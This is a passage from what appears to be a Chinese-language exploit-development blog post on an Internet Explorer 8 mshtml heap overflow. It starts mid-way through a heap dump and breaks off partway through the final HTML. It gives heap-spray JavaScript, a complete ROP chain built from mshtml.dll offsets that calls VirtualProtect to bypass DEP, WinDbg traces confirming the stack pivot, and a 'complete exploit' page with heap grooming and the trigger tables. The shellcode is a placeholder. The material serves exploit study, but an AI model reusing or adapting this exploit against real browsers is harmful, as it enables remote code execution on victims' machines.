MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 3ae0000  3b60000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 3b60000  3be0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 3be0000  3c60000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 3c60000  3ce0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 4a90000  4b10000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> ...</span><br><span class="line"> 6d40000  6dc0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 6dc0000  6e40000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 6e40000  6ec0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 6ec0000  6f40000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 6f40000  6fc0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 6fc0000  7040000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 7040000  70c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 70c0000  7140000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 7140000  71c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 71c0000  7240000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 7240000  72c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 72c0000  7340000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 7340000  73c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 73c0000  7440000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 7440000  74c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 74c0000  7540000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 7540000  75c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 75c0000  7640000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 7640000  76c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> 76c0000  7740000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line"> ...</span><br><span class="line">14fc0000 15040000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line">15040000 150c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line">150c0000 15140000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line">15140000 151c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line">151c0000 15240000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line">15240000 152c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line">152c0000 15340000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line">15340000 153c0000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br><span class="line">153c0000 15440000    80000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 000e0000; Type: Large block]</span><br></pre></td></tr></table></figure><p></p><p>可以看到，喷射的范围可以说是很广了。<br>这时我们需要选取一个地址，作为shellcode布置的地址，并覆写到虚表指针上去。<br>因为IE8开启了DEP保护，所以要求我们精准的将虚表指针改写到rop链上，其余地方都是无法执行的。<br>因为我们能够写入的数据都是125的倍数（width<em>125），所以这里我任意选择一个地址 `‭943208 </em>125 = 0x70706C8‬`</p><p>然后我们去查看相应内存地址<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; dd 07070010 l800</span><br><span class="line">07070010  90909090 90909090 90909090 cccccccc </span><br><span class="line">07070020  90909090 90909090 90909090 90909090 &lt;===</span><br><span class="line">07070030  90909090 90909090 90909090 90909090</span><br><span class="line">07070040  90909090 90909090 90909090 90909090</span><br><span class="line">07070050  90909090 90909090 90909090 90909090</span><br><span class="line">...</span><br><span class="line">07070690  90909090 90909090 90909090 90909090</span><br><span class="line">070706a0  90909090 90909090 90909090 90909090</span><br><span class="line">070706b0  90909090 90909090 90909090 90909090</span><br><span class="line">070706c0  90909090 90909090 90909090 90909090 &lt;===</span><br><span class="line">070706d0  90909090 90909090 90909090 90909090</span><br><span class="line">070706e0  90909090 90909090 90909090 90909090</span><br><span class="line">070706f0  90909090 90909090 90909090 90909090</span><br><span class="line">07070700  90909090 90909090 90909090 90909090</span><br></pre></td></tr></table></figure><p></p><p>可以看到<code>0x070706c8</code>shellcode块的起始位置是<code>0x07070020</code><br>所以，如果我想在<code>0x070706c8</code>处布置shellcode，那么就需要在保持块的大小前提下，在前后布置一定的padding<br>那么<code>front_offset = (0x070706c8 - 0x07070020) / 2 = 0x354</code></p><p>于是我们可以修改函数<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heap_spray</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">"spray..."</span>);</span><br><span class="line">    <span class="keyword">var</span> offset = <span class="number">0x354</span>;</span><br><span class="line">    <span class="keyword">var</span> heap_obj = <span class="keyword">new</span> heapLib.ie(<span class="number">0x10000</span>); </span><br><span class="line">    <span class="keyword">var</span> code = <span class="built_in">unescape</span>(<span class="string">"%ucccc%ucccc"</span>);    <span class="comment">//Code to execute</span></span><br><span class="line">    <span class="keyword">var</span> nops = <span class="built_in">unescape</span>(<span class="string">"%u9090%u9090"</span>);    <span class="comment">//NOPs</span></span><br><span class="line">    <span class="keyword">while</span> (nops.length &lt; <span class="number">0x1000</span>) nops+= nops; <span class="comment">// create big block of nops</span></span><br><span class="line">    <span class="keyword">var</span> front_padding = nops.substring(<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">var</span> tail_padding = nops.substring(<span class="number">0</span>, <span class="number">0x800</span> - front_padding.length - code.length);</span><br><span class="line">    <span class="keyword">var</span> shellcode =  front_padding + code + tail_padding;</span><br><span class="line">    <span class="keyword">while</span> (shellcode.length &lt; <span class="number">0x40000</span>) shellcode += shellcode;</span><br><span class="line">    <span class="keyword">var</span> block = shellcode.substring(<span class="number">2</span>, <span class="number">0x40000</span> - <span class="number">0x21</span>);</span><br><span class="line">    <span class="comment">//spray</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;</span><br><span class="line">        heap_obj.alloc(block);</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">"done"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>这时再进行调试，就可以发现code已经布置在我们预期的位置上了<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 070706c8</span><br><span class="line">070706c8  cccccccc 90909090 90909090 90909090</span><br><span class="line">070706d8  90909090 90909090 90909090 90909090</span><br><span class="line">070706e8  90909090 90909090 90909090 90909090</span><br><span class="line">070706f8  90909090 90909090 90909090 90909090</span><br><span class="line">07070708  90909090 90909090 90909090 90909090</span><br><span class="line">07070718  90909090 90909090 90909090 90909090</span><br><span class="line">07070728  90909090 90909090 90909090 90909090</span><br><span class="line">07070738  90909090 90909090 90909090 90909090</span><br></pre></td></tr></table></figure><p></p><h2 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h2><p>既然已经能够成功泄露出基址，那么我们就可以很容易的构造rop了。<br>这里我们会使用到<a href="https://github.com/corelan/mona" target="_blank" rel="noopener">mona.py</a>用来寻找合适的gadget，它是Immunity Debugger的一个插件<br>命令是：<code>!mona rop -m mshtml.dll</code><br>最后将生成的rop链转换成相对地址形式即可</p><h3 id="rop代码"><a href="#rop代码" class="headerlink" title="rop代码"></a>rop代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ropchain</span>(<span class="params">mshtmlbase</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [</span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x1d704</span>),   <span class="comment">//# RETN</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x6801b</span>),   <span class="comment">//# POP EBP # RETN</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x506603</span>),  <span class="comment">//# XCHG EAX,ESP # RETN 栈转移</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x25d87c</span>),  <span class="comment">//# POP EAX # RETN [mshtml.dll] </span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x1308</span>),    <span class="comment">//# ptr to &amp;VirtualProtect() [IAT mshtml.dll]</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x1a02a1</span>),  <span class="comment">//# MOV EAX,DWORD PTR DS:[EAX] # RETN [mshtml.dll] </span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0xcab0e</span>),   <span class="comment">//# XCHG EAX,ESI # RETN [mshtml.dll] </span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x50c71b</span>),  <span class="comment">//# POP EBP # RETN [mshtml.dll] </span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x1613b4</span>),  <span class="comment">//# &amp; jmp esp [mshtml.dll]</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0xa43ab</span>),   <span class="comment">//# POP EBX # RETN [mshtml.dll] </span></span><br><span class="line">        <span class="number">0x201</span>,                          <span class="comment">//# 0x00000201-&gt; ebx</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x27e491</span>),  <span class="comment">//# POP EDX # RETN [mshtml.dll]</span></span><br><span class="line">        <span class="number">0x40</span>,                             <span class="comment">//# 0x00000040-&gt; edx</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x6d267</span>),   <span class="comment">//# POP ECX # RETN [mshtml.dll]</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x53cc05</span>),  <span class="comment">//# &amp;Writable location [mshtml.dll]</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0xfb460</span>),   <span class="comment">//# POP EDI # RETN [mshtml.dll] </span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x424902</span>),  <span class="comment">//# RETN (ROP NOP) [mshtml.dll]</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0xa8005</span>),   <span class="comment">//# POP EAX # RETN [mshtml.dll] </span></span><br><span class="line">        <span class="number">0x90909090</span>,               <span class="comment">// nop</span></span><br><span class="line">        mshtmlbase + <span class="built_in">Number</span>(<span class="number">0x4f25d2</span>),  <span class="comment">//# PUSHAD # RETN [mshtml.dll]</span></span><br><span class="line">        <span class="number">0x90909090</span>,</span><br><span class="line">        <span class="number">0x90909090</span></span><br><span class="line">        ];</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ROP链的前三句，作用是栈转移，将<code>esp</code>转移到ROP链上<br>因为eax中正是ROP起始地址，所以交换<code>eax</code>和<code>esp</code>的值即可达到目的。</p><p>由《漏洞战争》中可知，虚表地址将会在这调用，<code>eax</code>保存了虚表指针值。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; u mshtml!NotifyElement+0x35</span><br><span class="line">mshtml!NotifyElement+0x3e:</span><br><span class="line">68067512 ff5008          call    dword ptr [eax+8]</span><br></pre></td></tr></table></figure><p></p><p>因为是<code>eax+8</code>，所以首先执行的是rop链的第三句，然后完成栈转移后，将会回到第一句。<br>第一句不做任何事，只是占位<br>第二句将把第三句pop出去，防止再次交换<code>eax</code>和<code>esp</code><br>之后的部分会调用<code>VirtualProtect()</code>，修改内存属性，使紧接在rop链后面的内存可以执行，绕过DEP</p><h3 id="调试笔记-2"><a href="#调试笔记-2" class="headerlink" title="调试笔记"></a>调试笔记</h3><p>首先通过打印log，获取vulheap中虚表指针所在的地址，然后在调用虚表处下条件断点<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0:011&gt; dd 02b9a2f8  l100</span><br><span class="line">02b9a2f8  070706c8 070706c8 070706c8 00000000</span><br><span class="line">...</span><br><span class="line">02b9a5e8  70706c88 070706c8 070706c8 070706c8</span><br><span class="line">02b9a5f8  00420042 00420042 00420042 70706c88</span><br><span class="line">02b9a608  070706c8 070706c8 070706c8 &lt;&lt;============ 地址：0x02b9a610</span><br><span class="line">02b9a618  02bbe920 68013c90 70706c88 070706c8</span><br><span class="line">02b9a628  070706c8 070706c8 00000000 00000000</span><br><span class="line">...</span><br><span class="line">0:011&gt; bu mshtml!NotifyElement+0x35 &quot;.if(@ecx &amp; 0x0`ffffffff)=02b9a610 &#123;&#125; .else&#123;gc&#125;&quot;</span><br><span class="line">0:011&gt; g</span><br><span class="line">eax=070706c8 ebx=01000000 ecx=02b9a610 edx=00000041 esi=025cf328 edi=02bbe920</span><br><span class="line">eip=68067512 esp=025cf164 ebp=025cf198 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!NotifyElement+0x3e:</span><br><span class="line">68067512 ff5008          call    dword ptr [eax+8]    ds:0023:070706d0=683a6603</span><br><span class="line">0:005&gt; t</span><br><span class="line">eax=070706c8 ebx=01000000 ecx=02b9a610 edx=00000041 esi=025cf328 edi=02bbe920</span><br><span class="line">eip=683a6603 esp=025cf160 ebp=025cf198 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!Ptls5::FsDestroyLayoutState+0x32b:</span><br><span class="line">683a6603 94              xchg    eax,esp</span><br><span class="line">...</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=00000201 ecx=070706bc edx=779764f4 esi=765950ab edi=682c4902</span><br><span class="line">eip=680013b4 esp=07070714 ebp=680013b4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!cbSystemColorsSize+0x38:</span><br><span class="line">680013b4 ffe4            jmp     esp &#123;07070714&#125;</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=00000201 ecx=070706bc edx=779764f4 esi=765950ab edi=682c4902</span><br><span class="line">eip=07070714 esp=07070714 ebp=680013b4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">07070714 90              nop</span><br></pre></td></tr></table></figure><p></p><p>在执行完rop后，会回到rop的结尾处，此时查看此处的内存属性<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !vprot 07070714</span><br><span class="line">BaseAddress:       07070000</span><br><span class="line">AllocationBase:    07050000</span><br><span class="line">AllocationProtect: 00000004  PAGE_READWRITE</span><br><span class="line">RegionSize:        00001000</span><br><span class="line">State:             00001000  MEM_COMMIT</span><br><span class="line">Protect:           00000040  PAGE_EXECUTE_READWRITE</span><br><span class="line">Type:              00020000  MEM_PRIVATE</span><br></pre></td></tr></table></figure><p></p><p>可以发现已经具有执行权限，只需将shellcode布置到此处即可。</p><h1 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"heaplib.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"evil"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> free = <span class="string">"EEEE"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (free.length &lt; <span class="number">480</span>) free += free;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> string1 = <span class="string">"AAAA"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (string1.length &lt; <span class="number">480</span>) string1 += string1;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> string2 = <span class="string">"BBBB"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (string2.length &lt; <span class="number">480</span>) string2 += string2;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> fr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> al = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> div_container = <span class="built_in">document</span>.getElementById(<span class="string">"evil"</span>);</span></span><br><span class="line"><span class="javascript">        div_container.style.cssText = <span class="string">"display:none"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="undefined">            fr[i] = free.substring(0, (0x100 - 6) / 2);</span></span><br><span class="line"><span class="undefined">            al[i] = string1.substring(0, (0x100 - 6) / 2);</span></span><br><span class="line"><span class="undefined">            al[i+1] = string2.substring(0, (0x100 - 6) / 2);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span></span><br><span class="line"><span class="undefined">            div_container.appendChild(obj);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">200</span>; i &lt; <span class="number">500</span>; i += <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="javascript">            fr[i] = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">            CollectGarbage();</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"1"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"2"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"3"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"5"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> 